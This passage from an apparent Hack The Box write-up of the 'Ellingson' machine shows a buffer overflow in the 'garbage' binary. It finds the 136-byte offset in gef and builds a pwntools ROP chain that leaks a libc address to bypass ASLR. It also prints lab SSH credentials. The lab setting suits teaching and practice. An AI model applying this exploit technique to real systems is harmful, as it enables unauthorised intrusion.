<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">No</span> <span class="n">PIE</span> 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">ASLR</code> is enabled so will need to get around that:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space
2
</code></pre></div></div>
<p>I downloaded <code class="language-plaintext highlighter-rouge">libc</code> from the box:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>margo@ellingson:~$ ldd /usr/bin/garbage
        linux-vdso.so.1 (0x00007ffd0a7f0000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f55ded1e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f55df10f000)
margo@ellingson:~$
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ellingson# scp margo@ellingson.htb:/lib/x86_64-linux-gnu/libc.so.6 ./
margo@ellingson.htb's password:
libc.so.6                                                                                                                                                                        100% 1983KB 263.6KB/s   00:07    
root@kali:~/Desktop/HTB/boxes/ellingson#
</code></pre></div></div>

<h2 id="binary-exploitation">Binary: Exploitation</h2>
<p>To defeat <code class="language-plaintext highlighter-rouge">ASLR</code> our first <code class="language-plaintext highlighter-rouge">rop</code> chain will leak <code class="language-plaintext highlighter-rouge">__libc_start_main</code> by calling <code class="language-plaintext highlighter-rouge">puts()</code> with <code class="language-plaintext highlighter-rouge">__libc_start_main@plt</code> address as an argument. Then by subtracting <code class="language-plaintext highlighter-rouge">__libc_start_main@@GLIBC</code> address from the leaked address we will get the base address of <code class="language-plaintext highlighter-rouge">libc</code>.<br>
After leaking <code class="language-plaintext highlighter-rouge">libc</code>’s address we can easily calculate the addresses we need and do our second chain which will perform the <code class="language-plaintext highlighter-rouge">ret2libc</code> attack.<br>
First we need to find the offset, I used a pattern to do it (I’m using <a href="https://github.com/hugsy/gef" target="_blank" rel="noopener noreferrer">gef</a>):</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">pattern</span> <span class="n">create</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">a</span> <span class="n">pattern</span> <span class="n">of</span> <span class="mi">1024</span> <span class="n">bytes</span>

<span class="n">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaa</span>
<span class="n">aaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaa</span>
<span class="n">acdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaade</span>
<span class="n">aaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaa</span>
<span class="n">aaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf</span>                               
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">as</span> <span class="err">'$</span><span class="n">_gef0</span><span class="err">'</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">r</span>
<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">garbage</span>

<span class="n">Enter</span> <span class="n">access</span> <span class="n">password</span><span class="o">:</span> <span class="n">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf</span>       

<span class="n">access</span> <span class="n">denied</span><span class="p">.</span>

<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
<span class="mh">0x0000000000401618</span> <span class="n">in</span> <span class="n">auth</span> <span class="p">()</span>
<span class="p">[</span> <span class="n">Legend</span><span class="o">:</span> <span class="n">Modified</span> <span class="k">register</span> <span class="o">|</span> <span class="n">Code</span> <span class="o">|</span> <span class="n">Heap</span> <span class="o">|</span> <span class="n">Stack</span> <span class="o">|</span> <span class="n">String</span> <span class="p">]</span>
<span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="n">registers</span> <span class="err">────</span>
<span class="err">$</span><span class="n">rax</span>   <span class="o">:</span> <span class="mh">0x0</span>
<span class="err">$</span><span class="n">rbx</span>   <span class="o">:</span> <span class="mh">0x0</span>
<span class="err">$</span><span class="n">rcx</span>   <span class="o">:</span> <span class="mh">0x00007f472f47a504</span>  <span class="err">→</span>  <span class="mh">0x5477fffff0003d48</span> <span class="p">(</span><span class="s">"H="</span><span class="o">?</span><span class="p">)</span>
<span class="err">$</span><span class="n">rdx</span>   <span class="o">:</span> <span class="mh">0x00007f472f54d8c0</span>  <span class="err">→</span>  <span class="mh">0x0000000000000000</span>
<span class="err">$</span><span class="n">rsp</span>   <span class="o">:</span> <span class="mh">0x00007ffcc590c3e8</span>  <span class="err">→</span>  <span class="s">"raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"</span>
<span class="err">$</span><span class="n">rbp</span>   <span class="o">:</span> <span class="mh">0x6161616161616171</span> <span class="p">(</span><span class="s">"qaaaaaaa"</span><span class="o">?</span><span class="p">)</span>
<span class="err">$</span><span class="n">rsi</span>   <span class="o">:</span> <span class="mh">0x000000000077c9c0</span>  <span class="err">→</span>  <span class="s">"access denied.</span><span class="se">\n</span><span class="s">ssword:"</span>
<span class="err">$</span><span class="n">rdi</span>   <span class="o">:</span> <span class="mh">0x0</span>
<span class="err">$</span><span class="n">rip</span>   <span class="o">:</span> <span class="mh">0x0000000000401618</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="n">auth</span><span class="o">+</span><span class="mi">261</span><span class="o">&gt;</span> <span class="n">ret</span> 
<span class="err">$</span><span class="n">r8</span>    <span class="o">:</span> <span class="mh">0x00007f472f552500</span>  <span class="err">→</span>  <span class="mh">0x00007f472f552500</span>  <span class="err">→</span>  <span class="p">[</span><span class="n">loop</span> <span class="n">detected</span><span class="p">]</span>
<span class="err">$</span><span class="n">r9</span>    <span class="o">:</span> <span class="mh">0x00007f472f54c848</span>  <span class="err">→</span>  <span class="mh">0x00007f472f54c760</span>  <span class="err">→</span>  <span class="mh">0x00000000fbad2a84</span>
<span class="err">$</span><span class="n">r10</span>   <span class="o">:</span> <span class="mh">0xfffffffffffff638</span>
<span class="err">$</span><span class="n">r11</span>   <span class="o">:</span> <span class="mh">0x246</span>
<span class="err">$</span><span class="n">r12</span>   <span class="o">:</span> <span class="mh">0x0000000000401170</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="n">_start</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">xor</span> <span class="n">ebp</span><span class="p">,</span> <span class="n">ebp</span>
<span class="err">$</span><span class="n">r13</span>   <span class="o">:</span> <span class="mh">0x00007ffcc590c4e0</span>  <span class="err">→</span>  <span class="s">"xaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaacea[...]"</span>
<span class="err">$</span><span class="n">r14</span>   <span class="o">:</span> <span class="mh">0x0</span>
<span class="err">$</span><span class="n">r15</span>   <span class="o">:</span> <span class="mh">0x0</span>
<span class="err">$</span><span class="n">eflags</span><span class="o">:</span> <span class="p">[</span><span class="n">ZERO</span> <span class="n">carry</span> <span class="n">PARITY</span> <span class="n">adjust</span> <span class="n">sign</span> <span class="n">trap</span> <span class="n">INTERRUPT</span> <span class="n">direction</span> <span class="n">overflow</span> <span class="n">RESUME</span> <span class="n">virtualx86</span> <span class="n">identification</span><span class="p">]</span>                                                                                                       
<span class="err">$</span><span class="n">cs</span><span class="o">:</span> <span class="mh">0x0033</span> <span class="err">$</span><span class="n">ss</span><span class="o">:</span> <span class="mh">0x002b</span> <span class="err">$</span><span class="n">ds</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="err">$</span><span class="n">es</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="err">$</span><span class="n">fs</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="err">$</span><span class="n">gs</span><span class="o">:</span> <span class="mh">0x0000</span>
<span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="n">stack</span> <span class="err">────</span>
<span class="mh">0x00007ffcc590c3e8</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0000</span><span class="o">:</span> <span class="s">"raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"</span>    <span class="err">←</span> <span class="err">$</span><span class="n">rsp</span>
<span class="mh">0x00007ffcc590c3f0</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0008</span><span class="o">:</span> <span class="s">"saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"</span>
<span class="mh">0x00007ffcc590c3f8</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0010</span><span class="o">:</span> <span class="s">"taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaaza[...]"</span>
<span class="mh">0x00007ffcc590c400</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0018</span><span class="o">:</span> <span class="s">"uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabba[...]"</span>
<span class="mh">0x00007ffcc590c408</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0020</span><span class="o">:</span> <span class="s">"vaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabca[...]"</span>
<span class="mh">0x00007ffcc590c410</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0028</span><span class="o">:</span> <span class="s">"waaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabda[...]"</span>
<span class="mh">0x00007ffcc590c418</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0030</span><span class="o">:</span> <span class="s">"xaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabea[...]"</span>
<span class="mh">0x00007ffcc590c420</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0038</span><span class="o">:</span> <span class="s">"yaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfa[...]"</span>
<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="n">code</span><span class="o">:</span><span class="n">x86</span><span class="o">:</span><span class="mi">64</span> <span class="err">────</span>
     <span class="mh">0x40160d</span> <span class="o">&lt;</span><span class="n">auth</span><span class="o">+</span><span class="mi">250</span><span class="o">&gt;</span>       <span class="n">call</span>   <span class="mh">0x401050</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
     <span class="mh">0x401612</span> <span class="o">&lt;</span><span class="n">auth</span><span class="o">+</span><span class="mi">255</span><span class="o">&gt;</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span> <span class="mh">0x0</span>
     <span class="mh">0x401617</span> <span class="o">&lt;</span><span class="n">auth</span><span class="o">+</span><span class="mi">260</span><span class="o">&gt;</span>       <span class="n">leave</span>  
 <span class="err">→</span>   <span class="mh">0x401618</span> <span class="o">&lt;</span><span class="n">auth</span><span class="o">+</span><span class="mi">261</span><span class="o">&gt;</span>       <span class="n">ret</span>    
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Cannot</span> <span class="n">disassemble</span> <span class="n">from</span> <span class="err">$</span><span class="n">PC</span>
<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="n">threads</span> <span class="err">────</span>
<span class="p">[</span><span class="err">#</span><span class="mi">0</span><span class="p">]</span> <span class="n">Id</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Name</span><span class="o">:</span> <span class="s">"garbage"</span><span class="p">,</span> <span class="n">stopped</span><span class="p">,</span> <span class="n">reason</span><span class="o">:</span> <span class="n">SIGSEGV</span>
<span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="n">trace</span> <span class="err">────</span>
<span class="p">[</span><span class="err">#</span><span class="mi">0</span><span class="p">]</span> <span class="mh">0x401618</span> <span class="err">→</span> <span class="n">auth</span><span class="p">()</span>
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">pattern</span> <span class="n">offset</span> <span class="n">raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Searching</span> <span class="err">'</span><span class="n">raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa</span><span class="err">'</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">136</span> <span class="p">(</span><span class="n">big</span><span class="o">-</span><span class="n">endian</span> <span class="n">search</span><span class="p">)</span>
<span class="n">gef</span><span class="err">➤</span>  

</code></pre></div></div>
<p>Offset is 136 bytes, let’s start writing the exploit (I’m using <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener noreferrer">pwntools</a>).<br>
First thing to do is to set-up the connection to the box and start the remote process, we have <code class="language-plaintext highlighter-rouge">ssh</code> access so we can use that:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'ellingson.htb'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">'margo'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'iamgod$08'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">'/usr/bin/garbage'</span><span class="p">)</span>
</code></pre></div></div>
<p>Then we need to load the binary file and <code class="language-plaintext highlighter-rouge">libc</code> in the exploit:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
</code></pre></div></div>
<p>We can use the <code class="language-plaintext highlighter-rouge">ROP()</code> function to load the <code class="language-plaintext highlighter-rouge">rop</code> gadgets from the binary:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">exploit.py</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'ellingson.htb'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">'margo'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'iamgod$08'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">'/usr/bin/garbage'</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="exploitation-leaking-libc-base-address">Exploitation: Leaking libc base address</h3>
<p>I created a function called <code class="language-plaintext highlighter-rouge">leak()</code> that takes 4 arguments (the process, the loaded binary file, <code class="language-plaintext highlighter-rouge">libc</code> and the <code class="language-plaintext highlighter-rouge">rop</code> gadgets):</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
</code></pre></div></div>
<p>This function will perform the 1st <code class="language-plaintext highlighter-rouge">rop</code> chain, it will send 136 bytes to reach <code class="language-plaintext highlighter-rouge">rip</code> and overwrite it with a <code class="language-plaintext highlighter-rouge">pop rdi, ret</code> gadget, then it will send <code class="language-plaintext highlighter-rouge">__libc_start_main@plt</code>’s address (will be placed in <code class="language-plaintext highlighter-rouge">rdi</code>) and call <code class="language-plaintext highlighter-rouge">puts()</code> which will take its argument from <code class="language-plaintext highlighter-rouge">rdi</code> and print the address of <code class="language-plaintext highlighter-rouge">__libc_start_main</code>. Finally it will call <code class="language-plaintext highlighter-rouge">main()</code> again to prevent execution from breaking (if the execution breaks the leaked address will be of no use because it won’t be the same when we execute the program again).<br>
We need the addresses of <code class="language-plaintext highlighter-rouge">pop rdi, ret</code> gadget, <code class="language-plaintext highlighter-rouge">__libc_start_main@plt</code> from the binary, <code class="language-plaintext highlighter-rouge">puts()@plt</code> from the binary, <code class="language-plaintext highlighter-rouge">main()</code> from the binary, to get them:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">LIBC_START_MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
	<span class="n">PUTS</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
</code></pre></div></div>
<p>Now we can simply construct the payload:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>
</code></pre></div></div>
<p>Finally we will send the payload and receive the leaked address:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaked __libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">leak</span>
</code></pre></div></div>
<p>Let’s test it:
<code class="language-plaintext highlighter-rouge">exploit.py</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">LIBC_START_MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
	<span class="n">PUTS</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
	
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts@plt: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"__libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"pop rdi gadget: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
	
	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>

	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaked __libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">leak</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'ellingson.htb'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">'margo'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'iamgod$08'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">'/usr/bin/garbage'</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>

<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
</code></pre></div></div>

